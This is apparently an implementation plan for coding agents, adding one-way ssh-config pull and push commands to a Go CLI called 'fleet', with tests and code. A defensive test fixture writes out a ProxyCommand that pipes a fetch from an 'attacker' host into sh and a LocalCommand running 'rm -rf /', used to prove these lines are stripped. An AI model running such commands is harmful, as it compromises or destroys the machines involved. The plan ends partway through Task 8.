# fleet config Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Give `fleet` two strictly one-way ssh-config verbs — `config pull` and `config push` — over one pure planner, with key-readiness reporting and no bidirectional operation.

**Architecture:** A pure package `internal/cfgplan` computes a `Plan` from two config texts and renders the result; `cmd/config_*.go` owns every side effect. `internal/sshconf` gains `Update` for field-level rewrites. Exec-safety is structural: `sshconf.Host` models only inert fields, so hostile directives cannot be represented and therefore cannot be written.

**Tech Stack:** Go 1.x, cobra, existing `internal/{sshconf,runner,sshfail,drift}`. No new third-party dependency.

**Spec:** [`../specs/fleet-config.md`](../specs/fleet-config.md) · design [`../designs/fleet-config.md`](../designs/fleet-config.md)

## Global Constraints

- **No private key ever leaves the workstation.** No task may read, transmit, or write a private key. Key work is a local `stat` plus public-key authorization only.
- **Everything but `runner` is pure** text-in/struct-out: no filesystem, network, or clock in `internal/`.
- **Every ssh-config write takes a timestamped backup first and keeps `0600`** — local for pull, remote for push.
- **Direction is always explicit.** No verb may move config both ways. There is no `fleet config sync`.
- Marker default is `#fleet`; both `#fleet` and `# fleet` must match (existing `hasMarker` behaviour).
- All probes run `BatchMode=yes` through `internal/runner`; failures are classified with `internal/sshfail`.
- `go test -race ./...` must stay green; `gofmt` and `go vet` clean; new packages ≥ 90% coverage.

## Interface decisions locked during planning

Two refinements to the spec's sketch, made after reading the existing writer:

1. **`sshconf.Add` cannot be used to update.** It purges the block and re-renders from the struct (`writer.go:66-70`), destroying unmodelled directives. `Add` is therefore used **only** for aliases that do not exist locally; every update goes through the new `Update`.
2. **Provenance needs no new API.** `render` emits `Host <alias>  <marker>`, and `hasMarker` is token-based, so passing `marker = "#fleet imported-from=<source>"` records provenance and still parses as fleet-marked. No timestamp, so a repeat pull stays a no-op.
3. **Naming:** the constructor is `cfgplan.Build` (not `Plan`) to avoid colliding with the `Plan` type; `Apply` is a method on `Plan`.

## File Structure

| File | Responsibility |
| :-- | :-- |
| `sdk/fleet/internal/cfgplan/cfgplan.go` (create) | Pure planner: `Build`, `Plan.Apply`, `Plan.Empty`, reporting scan. |
| `sdk/fleet/internal/cfgplan/cfgplan_test.go` (create) | Table tests incl. the hostile-source fixture. |
| `sdk/fleet/internal/sshconf/writer.go` (modify) | Add `Update` — field-level rewrite preserving unmodelled lines. |
| `sdk/fleet/internal/sshconf/writer_test.go` (modify) | `Update` tests. |
| `sdk/fleet/cmd/config.go` (create) | `config` parent verb; shared render/confirm/backup helpers. |
| `sdk/fleet/cmd/config_pull.go` (create) | Pull I/O, loopback guard, key readiness, keys offer. |
| `sdk/fleet/cmd/config_push.go` (create) | Push I/O, validation, self-retarget guard, post-probe. |
| `sdk/fleet/cmd/config_diff.go` (create) | Read-only render, both directions. |
| `sdk/fleet/cmd/keys.go` (modify) | `--host` filter on `keys sync`. |
| `sdk/fleet/cmd/root.go` (modify) | Register `configCmd`. |
| `sdk/fleet/cmd/tui_*.go` (modify) | `p` / `P` bindings via `keyHelp`. |
| `sdk/fleet/AGENTS.md` (modify) | New invariants. |

---

### Task 1: cfgplan — classify add / update / unchanged

**Files:**
- Create: `sdk/fleet/internal/cfgplan/cfgplan.go`
- Test: `sdk/fleet/internal/cfgplan/cfgplan_test.go`

**Interfaces:**
- Consumes: `sshconf.Parse(cfg, marker) ([]Host, error)`, `sshconf.Host{Alias,HostName,User,Port,Identity,Fleet}`.
- Produces: `ChangeKind`, `FieldDelta`, `Change`, `Opts`, `Plan`, `Build(localText, remoteText string, o Opts) (Plan, error)`, `Plan.Empty() bool`.

- [ ] **Step 1: Write the failing test**

```go
package cfgplan

import "testing"

const localCfg = "Host keep  #fleet\n    HostName 10.0.0.1\n    User me\n"

func TestBuildClassifiesAddUpdateAndUnchanged(t *testing.T) {
	remote := "Host keep  #fleet\n    HostName 10.0.0.9\n    User me\n" +
		"Host fresh  #fleet\n    HostName 10.0.0.2\n"
	p, err := Build(localCfg, remote, Opts{Marker: "#fleet", Source: "src"})
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]ChangeKind{}
	for _, c := range p.Changes {
		got[c.Alias] = c.Kind
	}
	if got["fresh"] != Add {
		t.Errorf("fresh = %q, want %q", got["fresh"], Add)
	}
	if got["keep"] != Update {
		t.Errorf("keep = %q, want %q", got["keep"], Update)
	}
}

// A field that did not move must not be reported as a change: the diff is the
// operator's only safety, so noise in it is a correctness problem.
func TestBuildReportsOnlyFieldsThatMoved(t *testing.T) {
	remote := "Host keep  #fleet\n    HostName 10.0.0.9\n    User me\n"
	p, _ := Build(localCfg, remote, Opts{Marker: "#fleet", Source: "src"})
	if len(p.Changes) != 1 || len(p.Changes[0].Fields) != 1 {
		t.Fatalf("want exactly one field delta, got %+v", p.Changes)
	}
	if f := p.Changes[0].Fields[0]; f.Name != "HostName" || f.From != "10.0.0.1" || f.To != "10.0.0.9" {
		t.Fatalf("delta = %+v", f)
	}
}

// Only marked blocks travel unless All is set — the source decides what it shares.
func TestBuildHonoursTheMarkerScope(t *testing.T) {
	remote := "Host personal\n    HostName 10.0.0.3\n"
	if p, _ := Build("", remote, Opts{Marker: "#fleet"}); len(p.Changes) != 0 {
		t.Fatalf("unmarked host must not travel, got %+v", p.Changes)
	}
	if p, _ := Build("", remote, Opts{Marker: "#fleet", All: true}); len(p.Changes) != 1 {
		t.Fatalf("--all must include it, got %+v", p.Changes)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sdk/fleet && go test ./internal/cfgplan/`
Expected: FAIL — `undefined: Build`, `undefined: Opts`.

- [ ] **Step 3: Write minimal implementation**

```go
// Package cfgplan computes a one-way ssh-config transfer as a reviewable plan.
// It is pure: no filesystem, no network, no clock. Direction lives entirely in
// the caller's choice of which text is "local" and which is "remote".
package cfgplan

import (
	"fmt"
	"sort"

	"github.com/sfc-gh-eraigosa/dotfiles/sdk/fleet/internal/sshconf"
)

type ChangeKind string

const (
	Add       ChangeKind = "add"
	Update    ChangeKind = "update"
	Unchanged ChangeKind = "unchanged"
	Skipped   ChangeKind = "skipped"
)

type FieldDelta struct{ Name, From, To string }

type Change struct {
	Alias  string
	Kind   ChangeKind
	Host   sshconf.Host
	Fields []FieldDelta
	Reason string
}

type Opts struct {
	Marker string
	All    bool
	Source string
}

type Plan struct {
	Source      string
	Changes     []Change
	Includes    int
	NotImported []string
}

// Empty reports whether applying this plan would change nothing.
func (p Plan) Empty() bool {
	for _, c := range p.Changes {
		if c.Kind == Add || c.Kind == Update {
			return false
		}
	}
	return true
}

// deltas lists the modelled fields that differ, in a stable order so the
// rendered diff never reshuffles between runs.
func deltas(from, to sshconf.Host) []FieldDelta {
	var out []FieldDelta
	for _, f := range []struct{ name, a, b string }{
		{"HostName", from.HostName, to.HostName},
		{"User", from.User, to.User},
		{"Port", from.Port, to.Port},
		{"IdentityFile", from.Identity, to.Identity},
	} {
		// An empty remote value never blanks a local one: omission is not an
		// instruction to delete.
		if f.b != "" && f.a != f.b {
			out = append(out, FieldDelta{Name: f.name, From: f.a, To: f.b})
		}
	}
	return out
}

// merge returns the local host with the remote's non-empty modelled fields
// applied, so an update never blanks a field the source simply did not set.
func merge(local, remote sshconf.Host) sshconf.Host {
	out := local
	if remote.HostName != "" {
		out.HostName = remote.HostName
	}
	if remote.User != "" {
		out.User = remote.User
	}
	if remote.Port != "" {
		out.Port = remote.Port
	}
	if remote.Identity != "" {
		out.Identity = remote.Identity
	}
	return out
}

func Build(localText, remoteText string, o Opts) (Plan, error) {
	if o.Marker == "" {
		o.Marker = "#fleet"
	}
	locals, err := sshconf.Parse(localText, o.Marker)
	if err != nil {
		return Plan{}, fmt.Errorf("cfgplan: local config: %w", err)
	}
	remotes, err := sshconf.Parse(remoteText, o.Marker)
	if err != nil {
		return Plan{}, fmt.Errorf("cfgplan: remote config: %w", err)
	}
	byAlias := map[string]sshconf.Host{}
	for _, h := range locals {
		byAlias[h.Alias] = h
	}

	p := Plan{Source: o.Source}
	for _, r := range remotes {
		if !r.Fleet && !o.All {
			continue
		}
		local, exists := byAlias[r.Alias]
		if !exists {
			p.Changes = append(p.Changes, Change{Alias: r.Alias, Kind: Add, Host: r})
			continue
		}
		d := deltas(local, r)
		if len(d) == 0 {
			p.Changes = append(p.Changes, Change{Alias: r.Alias, Kind: Unchanged, Host: local})
			continue
		}
		p.Changes = append(p.Changes, Change{
			Alias: r.Alias, Kind: Update, Host: merge(local, r), Fields: d,
		})
	}
	sort.Slice(p.Changes, func(i, j int) bool { return p.Changes[i].Alias < p.Changes[j].Alias })
	return p, nil
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sdk/fleet && go test ./internal/cfgplan/ -v`
Expected: PASS, all three tests.

- [ ] **Step 5: Commit**

```bash
git add sdk/fleet/internal/cfgplan/
git commit -m "feat(fleet): cfgplan classifies a one-way config transfer"
```

---

### Task 2: cfgplan — name what was withheld

**Files:**
- Modify: `sdk/fleet/internal/cfgplan/cfgplan.go`
- Test: `sdk/fleet/internal/cfgplan/cfgplan_test.go`

**Interfaces:**
- Produces: `Plan.NotImported []string`, `Plan.Includes int` (both populated by `Build`).

Exec-safety is structural — unmodelled directives cannot be represented — so this task exists purely to make the exclusion *visible*.

- [ ] **Step 1: Write the failing test**

```go
// The hostile fixture is a permanent regression test: these directives execute
// commands on the IMPORTING machine, so none may ever reach the output.
const hostileCfg = `Host evil  #fleet
    HostName 10.0.0.6
    ProxyCommand /bin/sh -c 'curl attacker|sh'
    LocalCommand /bin/rm -rf /
    PermitLocalCommand yes
`

func TestBuildNeverCarriesAnExecDirective(t *testing.T) {
	p, _ := Build("", hostileCfg, Opts{Marker: "#fleet", Source: "src"})
	out, err := p.Apply("")
	if err != nil {
		t.Fatal(err)
	}
	for _, bad := range []string{"ProxyCommand", "LocalCommand", "PermitLocalCommand", "curl", "rm -rf"} {
		if strings.Contains(out, bad) {
			t.Fatalf("applied config contains %q:\n%s", bad, out)
		}
	}
}

func TestBuildNamesWhatItWithheld(t *testing.T) {
	p, _ := Build("", hostileCfg, Opts{Marker: "#fleet"})
	want := []string{"LocalCommand", "PermitLocalCommand", "ProxyCommand"}
	if !reflect.DeepEqual(p.NotImported, want) {
		t.Fatalf("NotImported = %v, want %v", p.NotImported, want)
	}
}

// cat does not follow Include; silently missing those hosts is worse than
// saying so.
func TestBuildCountsIncludeDirectives(t *testing.T) {
	cfg := "Include ~/.ssh/work.d/*\n# Include commented-out\nHost a  #fleet\n    HostName 10.0.0.7\n"
	p, _ := Build("", cfg, Opts{Marker: "#fleet"})
	if p.Includes != 1 {
		t.Fatalf("Includes = %d, want 1 (a commented Include is not a directive)", p.Includes)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sdk/fleet && go test ./internal/cfgplan/ -run 'Withheld|Include|Exec'`
Expected: FAIL — `NotImported` empty, `Includes` zero, `Apply` undefined.

- [ ] **Step 3: Write minimal implementation**

Add to `cfgplan.go`:

```go
// modelled is the set of directives sshconf.Host can carry. Anything else is
// reported as withheld — it can never be written, because there is no field to
// hold it.
var modelled = map[string]bool{
	"host": true, "hostname": true, "user": true, "port": true, "identityfile": true,
}

// scanWithheld walks the raw text and reports the distinct directive names that
// appear inside concrete Host blocks but have no home in the model, plus the
// number of Include directives (which `cat` does not follow).
func scanWithheld(text string) (names []string, includes int) {
	seen := map[string]bool{}
	inConcrete := false
	for _, line := range strings.Split(text, "\n") {
		t := strings.TrimSpace(line)
		if t == "" || strings.HasPrefix(t, "#") {
			continue
		}
		fields := strings.Fields(t)
		key := strings.ToLower(fields[0])
		if key == "include" {
			includes++
			continue
		}
		if key == "host" {
			// A pattern block configures defaults, not a machine; Parse skips
			// them, so their directives are not "withheld" from anything.
			inConcrete = len(fields) >= 2 &&
				!strings.ContainsAny(strings.Join(fields[1:], " "), "*?")
			continue
		}
		if inConcrete && !modelled[key] && !seen[key] {
			seen[key] = true
			names = append(names, fields[0])
		}
	}
	sort.Strings(names)
	return names, includes
}
```

and in `Build`, before the return:

```go
	p.NotImported, p.Includes = scanWithheld(remoteText)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sdk/fleet && go test ./internal/cfgplan/`
Expected: PASS (the exec test still needs Task 3's `Apply`; run it again at the end of Task 3).

- [ ] **Step 5: Commit**

```bash
git add sdk/fleet/internal/cfgplan/
git commit -m "feat(fleet): cfgplan names withheld directives and Include misses"
```

---

### Task 3: sshconf.Update — field-level rewrite

**Files:**
- Modify: `sdk/fleet/internal/sshconf/writer.go`
- Test: `sdk/fleet/internal/sshconf/writer_test.go`

**Interfaces:**
- Produces: `func Update(cfg string, h Host) (string, error)`.

`Add` purges and re-renders (`writer.go:66-70`), so it destroys unmodelled directives. `Update` is what makes a `HostName` refresh non-destructive.

- [ ] **Step 1: Write the failing test**

```go
// The whole reason Update exists: Add would purge the block and take the
// operator's ProxyCommand with it.
func TestUpdateRewritesOnlyModelledDirectives(t *testing.T) {
	cfg := "Host a  #fleet\n    HostName 10.0.0.1\n    ProxyCommand nc %h %p\n    # a human note\n"
	got, err := Update(cfg, Host{Alias: "a", HostName: "10.0.0.9"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, "HostName 10.0.0.9") {
		t.Fatalf("HostName not updated:\n%s", got)
	}
	for _, keep := range []string{"ProxyCommand nc %h %p", "# a human note", "#fleet"} {
		if !strings.Contains(got, keep) {
			t.Fatalf("Update dropped %q:\n%s", keep, got)
		}
	}
}

// A modelled directive absent from the block must be inserted, not silently
// skipped, or an imported User would never land.
func TestUpdateInsertsAMissingModelledDirective(t *testing.T) {
	got, _ := Update("Host a  #fleet\n    HostName 10.0.0.1\n", Host{Alias: "a", User: "pilot"})
	if !strings.Contains(got, "User pilot") {
		t.Fatalf("missing directive not inserted:\n%s", got)
	}
}

func TestUpdateNeverBlanksAFieldTheCallerOmitted(t *testing.T) {
	got, _ := Update("Host a  #fleet\n    HostName 10.0.0.1\n    User me\n", Host{Alias: "a", HostName: "10.0.0.9"})
	if !strings.Contains(got, "User me") {
		t.Fatalf("omitted field was blanked:\n%s", got)
	}
}

func TestUpdateRejectsAnUnknownAlias(t *testing.T) {
	if _, err := Update("Host a\n", Host{Alias: "nope", HostName: "x"}); err == nil {
		t.Fatal("want an error for an unknown alias")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sdk/fleet && go test ./internal/sshconf/ -run Update`
Expected: FAIL — `undefined: Update`.

- [ ] **Step 3: Write minimal implementation**

```go
// Update rewrites ONLY the modelled directives of an existing block, in place,
// preserving every unmodelled line, comment, marker, and their order. Add is
// unusable for this: it purges the block and re-renders from the struct, which
// would take an operator's ProxyCommand with it.
//
// An empty field is "leave alone", never "blank it": omission is not an
// instruction to delete.
func Update(cfg string, h Host) (string, error) {
	lines := strings.Split(cfg, "\n")
	start, end, ok := blockRange(lines, h.Alias)
	if !ok {
		return "", fmt.Errorf("sshconf: host %q not found", h.Alias)
	}
	want := []struct{ k, v string }{
		{"HostName", h.HostName}, {"User", h.User},
		{"Port", h.Port}, {"IdentityFile", h.Identity},
	}
	seen := map[string]bool{}
	out := append([]string{}, lines[:start+1]...)
	for i := start + 1; i < end; i++ {
		code, comment := splitComment(strings.TrimSpace(lines[i]))
		f := strings.Fields(code)
		replaced := false
		if len(f) >= 2 {
			for _, kv := range want {
				if strings.EqualFold(f[0], kv.k) && kv.v != "" {
					line := "    " + kv.k + " " + kv.v
					if comment != "" {
						line += "  " + comment
					}
					out = append(out, line)
					seen[kv.k], replaced = true, true
					break
				}
			}
		}
		if !replaced {
			out = append(out, lines[i])
		}
	}
	// Insert any modelled directive the block did not already carry.
	for _, kv := range want {
		if kv.v != "" && !seen[kv.k] {
			out = append(out, "    "+kv.k+" "+kv.v)
		}
	}
	out = append(out, lines[end:]...)
	return normalize(strings.Join(out, "\n")), nil
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sdk/fleet && go test ./internal/sshconf/`
Expected: PASS, including the pre-existing writer tests.

- [ ] **Step 5: Commit**

```bash
git add sdk/fleet/internal/sshconf/
git commit -m "feat(fleet): sshconf.Update rewrites modelled directives in place"
```

---

### Task 4: cfgplan.Apply — render the new text

**Files:**
- Modify: `sdk/fleet/internal/cfgplan/cfgplan.go`
- Test: `sdk/fleet/internal/cfgplan/cfgplan_test.go`

**Interfaces:**
- Consumes: `sshconf.Add(cfg, h, marker)`, `sshconf.Update(cfg, h)` (Task 3).
- Produces: `func (p Plan) Apply(cfg string) (string, error)`.

- [ ] **Step 1: Write the failing test**

```go
// Provenance rides in the marker string, so no sshconf API change is needed —
// and it carries NO timestamp, so a repeat pull is a genuine no-op.
func TestApplyStampsProvenanceAndStaysIdempotent(t *testing.T) {
	remote := "Host fresh  #fleet\n    HostName 10.0.0.2\n"
	p, _ := Build("", remote, Opts{Marker: "#fleet", Source: "src"})
	once, err := p.Apply("")
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(once, "imported-from=src") {
		t.Fatalf("no provenance:\n%s", once)
	}
	p2, _ := Build(once, remote, Opts{Marker: "#fleet", Source: "src"})
	if !p2.Empty() {
		t.Fatalf("second pull is not a no-op: %+v", p2.Changes)
	}
	twice, _ := p2.Apply(once)
	if twice != once {
		t.Fatalf("re-apply changed bytes:\n%s\n---\n%s", once, twice)
	}
}

func TestApplyUpdatesWithoutDestroyingLocalLines(t *testing.T) {
	local := "Host a  #fleet\n    HostName 10.0.0.1\n    ProxyCommand nc %h %p\n"
	p, _ := Build(local, "Host a  #fleet\n    HostName 10.0.0.9\n", Opts{Marker: "#fleet", Source: "src"})
	got, _ := p.Apply(local)
	if !strings.Contains(got, "ProxyCommand nc %h %p") || !strings.Contains(got, "10.0.0.9") {
		t.Fatalf("update was destructive:\n%s", got)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sdk/fleet && go test ./internal/cfgplan/ -run Apply`
Expected: FAIL — `p.Apply undefined`.

- [ ] **Step 3: Write minimal implementation**

```go
// Apply renders the destination text for a plan the caller has confirmed.
// Add is used ONLY for aliases that do not exist yet (it purges and re-renders,
// which would destroy unmodelled lines); every update goes through Update.
func (p Plan) Apply(cfg string) (string, error) {
	marker := "#fleet"
	if p.Source != "" {
		marker += " imported-from=" + p.Source
	}
	out := cfg
	var err error
	for _, c := range p.Changes {
		switch c.Kind {
		case Add:
			out, err = sshconf.Add(out, c.Host, marker)
		case Update:
			out, err = sshconf.Update(out, c.Host)
		default:
			continue
		}
		if err != nil {
			return "", fmt.Errorf("cfgplan: %s %s: %w", c.Kind, c.Alias, err)
		}
	}
	return out, nil
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sdk/fleet && go test ./internal/cfgplan/ && go test -race ./...`
Expected: PASS everywhere, including Task 2's hostile-source test.

- [ ] **Step 5: Commit**

```bash
git add sdk/fleet/internal/cfgplan/
git commit -m "feat(fleet): cfgplan.Apply renders adds and non-destructive updates"
```

---

### Task 5: `fleet config pull` — the I/O verb

**Files:**
- Create: `sdk/fleet/cmd/config.go`, `sdk/fleet/cmd/config_pull.go`
- Modify: `sdk/fleet/cmd/root.go`
- Test: `sdk/fleet/cmd/config_pull_test.go`

**Interfaces:**
- Consumes: `cfgplan.Build/Apply`, `runner.Runner`, `sshfail.Classify/Note`, `sshconf.Parse`.
- Produces: `configCmd`, `pullPlan(r runner.Runner, source, localText string, o cfgplan.Opts) (cfgplan.Plan, error)`, `renderPlan(p cfgplan.Plan) string`, `backupFile(path string) (string, error)`.

- [ ] **Step 1: Write the failing test**

```go
func TestPullPlanReadsTheRemoteConfigOverTheRunnerSeam(t *testing.T) {
	r := runner.Fake{Out: map[string]string{"src": "Host fresh  #fleet\n    HostName 10.0.0.2\n"}}
	p, err := pullPlan(r, "src", "", cfgplan.Opts{Marker: "#fleet", Source: "src"})
	if err != nil {
		t.Fatal(err)
	}
	if len(p.Changes) != 1 || p.Changes[0].Kind != cfgplan.Add {
		t.Fatalf("plan = %+v", p.Changes)
	}
}

// A trust failure must not be reported as a network one — the lesson already
// pinned in internal/sshfail.
func TestPullReportsATrustFailureAsSuch(t *testing.T) {
	_, err := exec.Command("sh", "-c", `printf 'Host key verification failed.' >&2; exit 255`).Output()
	r := runner.Fake{Err: map[string]error{"src": err}}
	_, perr := pullPlan(r, "src", "", cfgplan.Opts{Marker: "#fleet"})
	if perr == nil || !strings.Contains(perr.Error(), "host key unverified") {
		t.Fatalf("err = %v, want it to name the trust fault", perr)
	}
}

// Reading a host must never write to it.
func TestPullOnlyEverReadsTheSource(t *testing.T) {
	var argv []string
	r := recordingRunner{out: "Host a  #fleet\n    HostName 10.0.0.1\n", seen: &argv}
	_, _ = pullPlan(r, "src", "", cfgplan.Opts{Marker: "#fleet"})
	joined := strings.Join(argv, " ")
	for _, banned := range []string{">", "tee", "cp ", "mv ", "rm ", "sed -i", "install"} {
		if strings.Contains(joined, banned) {
			t.Fatalf("pull issued a mutating command: %q", joined)
		}
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sdk/fleet && go test ./cmd/ -run Pull`
Expected: FAIL — `undefined: pullPlan`.

- [ ] **Step 3: Write minimal implementation**

`config.go` defines the parent verb and shared helpers; `config_pull.go`:

```go
// remoteConfigCmd is a pure READ. A pull must never mutate its source — the
// same discipline the wake ladder holds to.
const remoteConfigCmd = "cat ~/.ssh/config 2>/dev/null"

func pullPlan(r runner.Runner, source, localText string, o cfgplan.Opts) (cfgplan.Plan, error) {
	out, err := r.Run(source, remoteConfigCmd)
	if err != nil {
		if n := sshfail.Note(err); n != "" {
			return cfgplan.Plan{}, fmt.Errorf("%s: %s", source, n)
		}
		return cfgplan.Plan{}, fmt.Errorf("%s: %w", source, err)
	}
	if strings.TrimSpace(out) == "" {
		return cfgplan.Plan{}, fmt.Errorf("%s: no readable ~/.ssh/config", source)
	}
	return cfgplan.Build(localText, out, o)
}
```

Register `configCmd` in `root.go` and add flags `--all`, `--dry-run`, `--yes`, `--marker`.

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sdk/fleet && go test ./cmd/`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add sdk/fleet/cmd/
git commit -m "feat(fleet): config pull reads a source config over the runner seam"
```

---

### Task 6: write safety — backup, dry-run, loopback guard

**Files:**
- Modify: `sdk/fleet/cmd/config.go`, `sdk/fleet/cmd/config_pull.go`
- Test: `sdk/fleet/cmd/config_pull_test.go`

**Interfaces:**
- Produces: `backupFile(path string) (string, error)`, `isLoopbackSource(alias string) (bool, error)`, `writeConfig(path, text string) error`.

- [ ] **Step 1: Write the failing test**

```go
func TestWriteConfigBacksUpFirstAndKeeps0600(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "config")
	if err := os.WriteFile(p, []byte("Host a\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := writeConfig(p, "Host b\n"); err != nil {
		t.Fatal(err)
	}
	hits, _ := filepath.Glob(p + ".bak.*")
	if len(hits) != 1 {
		t.Fatalf("want exactly one timestamped backup, got %v", hits)
	}
	if b, _ := os.ReadFile(hits[0]); string(b) != "Host a\n" {
		t.Fatalf("backup holds %q, want the ORIGINAL text", b)
	}
	fi, _ := os.Stat(p)
	if fi.Mode().Perm() != 0o600 {
		t.Fatalf("mode = %v, want 0600", fi.Mode().Perm())
	}
}

// A fleet member's own alias commonly resolves to 127.0.0.1 via /etc/hosts;
// pulling from yourself is a confusing no-op, so refuse before connecting.
func TestLoopbackSourceIsRefused(t *testing.T) {
	for _, tc := range []struct {
		host string
		want bool
	}{{"127.0.0.1", true}, {"::1", true}, {"127.1.2.3", true}, {"192.168.0.5", false}} {
		if got := isLoopbackHostName(tc.host); got != tc.want {
			t.Errorf("isLoopbackHostName(%q) = %v, want %v", tc.host, got, tc.want)
		}
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sdk/fleet && go test ./cmd/ -run 'WriteConfig|Loopback'`
Expected: FAIL — `undefined: writeConfig`, `undefined: isLoopbackHostName`.

- [ ] **Step 3: Write minimal implementation**

```go
// writeConfig backs the file up before touching it. A bad write costs SSH
// access to every machine, so the backup is not optional and not conditional.
func writeConfig(path, text string) error {
	orig, err := os.ReadFile(path)
	if err != nil && !os.IsNotExist(err) {
		return err
	}
	if err == nil {
		bak := fmt.Sprintf("%s.bak.%s", path, time.Now().Format("20060102-150405"))
		if err := os.WriteFile(bak, orig, 0o600); err != nil {
			return fmt.Errorf("backup: %w", err)
		}
	}
	return os.WriteFile(path, []byte(text), 0o600)
}

// isLoopbackHostName reports whether a resolved HostName points at this machine.
func isLoopbackHostName(h string) bool {
	ip := net.ParseIP(strings.TrimSpace(h))
	return ip != nil && ip.IsLoopback()
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sdk/fleet && go test ./cmd/`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add sdk/fleet/cmd/
git commit -m "feat(fleet): config pull write safety — backup, 0600, loopback guard"
```

---

### Task 7: key readiness (F8)

**Files:**
- Create: `sdk/fleet/cmd/config_keys.go`
- Test: `sdk/fleet/cmd/config_keys_test.go`

**Interfaces:**
- Produces: `missingIdentities(p cfgplan.Plan, exists func(string) bool) []string`.

- [ ] **Step 1: Write the failing test**

```go
// An imported IdentityFile is only a PATH. If the key is not here, the alias
// looks configured and fails at connect time — so name the miss.
func TestMissingIdentitiesNamesAbsentKeys(t *testing.T) {
	p := cfgplan.Plan{Changes: []cfgplan.Change{
		{Alias: "a", Kind: cfgplan.Add, Host: sshconf.Host{Alias: "a", Identity: "~/.ssh/id_here"}},
		{Alias: "b", Kind: cfgplan.Add, Host: sshconf.Host{Alias: "b", Identity: "~/.ssh/id_gone"}},
		{Alias: "c", Kind: cfgplan.Add, Host: sshconf.Host{Alias: "c"}},
	}}
	got := missingIdentities(p, func(path string) bool { return strings.HasSuffix(path, "id_here") })
	if len(got) != 1 || !strings.Contains(got[0], "id_gone") {
		t.Fatalf("got %v, want only the absent key named", got)
	}
}

// Private keys never move between machines; this check is a local stat only.
func TestKeyReadinessNeverReadsKeyMaterial(t *testing.T) {
	var opened []string
	_ = missingIdentities(
		cfgplan.Plan{Changes: []cfgplan.Change{{Alias: "a", Kind: cfgplan.Add,
			Host: sshconf.Host{Alias: "a", Identity: "~/.ssh/id_x"}}}},
		func(p string) bool { opened = append(opened, p); return true },
	)
	if len(opened) != 1 {
		t.Fatalf("existence probe called %d times, want exactly 1 stat", len(opened))
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sdk/fleet && go test ./cmd/ -run 'Identities|KeyReadiness'`
Expected: FAIL — `undefined: missingIdentities`.

- [ ] **Step 3: Write minimal implementation**

```go
// missingIdentities reports imported IdentityFile paths that do not exist
// locally. `exists` is injected so the check is testable and so this function
// can never read key MATERIAL — it only ever asks whether a path is present.
func missingIdentities(p cfgplan.Plan, exists func(string) bool) []string {
	var out []string
	for _, c := range p.Changes {
		if c.Kind != cfgplan.Add && c.Kind != cfgplan.Update {
			continue
		}
		if c.Host.Identity == "" || exists(c.Host.Identity) {
			continue
		}
		out = append(out, fmt.Sprintf("%s → %s (missing)", c.Alias, c.Host.Identity))
	}
	return out
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sdk/fleet && go test ./cmd/`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add sdk/fleet/cmd/
git commit -m "feat(fleet): report imported hosts whose IdentityFile is absent locally"
```

---

### Task 8: `keys sync --host` (F9) and the post-pull offer (F10)

**Files:**
- Modify: `sdk/fleet/cmd/keys.go`
- Modify: `sdk/fleet/cmd/config_pull.go`
- Test: `sdk/fleet/cmd/keys_test.go`, `sdk/fleet/cmd/config_keys_test.go`

**Interfaces:**
- Produces: `keysSyncHosts []string` flag var; `bootstrapNeeded(rows []Row) []string`.

`keys sync` today filters by *key* name only, so a pull cannot authorize just what it added.

- [ ] **Step 1: Write the failing test**

```go
func TestKeysSyncHostFlagRestrictsTargets(t *testing.T) {
	all := []sshconf.Host{{Alias: "a"}, {Alias: "b"}, {Alias: "c"}}
	got := filterHosts(all, []string{"a", "c"})
	if len(got) != 2 || got[0].Alias != "a" || got[1].Alias != "c" {
		t.Fatalf("filterHosts = %+v", got)
	}
}

func TestKeysSyncHostFlagRejectsAnUnknownAlias(t *testing.T) {
	if _, err := checkHosts([]sshconf.Host{{Alias: "a"}}, []string{"nope"}); err == nil {
		t.Fatal("want an error naming the unknown alias")
	}
}

// keys sync APPENDS to a remote authorized_keys, so it needs access it does not
// have. Claiming it can bootstrap a refusing host would be a lie.
func TestHostsThatRefuseUsAreReportedAsManualBootstrap(t *testing.T) {
	rows := []Row{
		{Alias: "ok", Class: "up-to-date"},
		{Alias: "blocked", Class: "auth-failed"},
		{Alias: "dead", Class: "unreachable"},
	}
	got := bootstrapNeeded(rows)
	if len(got) != 2 {
		t.Fatalf("got %v, want both blocked and dead listed", got)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sdk/fleet && go test ./cmd/ -run 'KeysSync|Bootstrap'`
Expected: FAIL — `undefined: filterHosts`, `undefined: bootstrapNeeded`.

- [ ] **Step 3: Write minimal implementation**

```go
func filterHosts(all []sshconf.Host, only []string) []sshconf.Host {
	if len(only) == 0 {
		return all
	}
	want := map[string]bool{}
	for _, a := range only {
		want[a] = true
	}
	var out []sshconf.Host
	for _, h := range all {
		if want[h.Alias] {
			out = append(out, h)
		}
	}
	return out
}

func checkHosts(all []sshconf.Host, only []string) ([]sshconf.Host, error) {
	have := map[string]bool{}
	for _, h := range all {
		have[h.Alias] = true
	}
	for _, a := range only {
		if !have[a] {
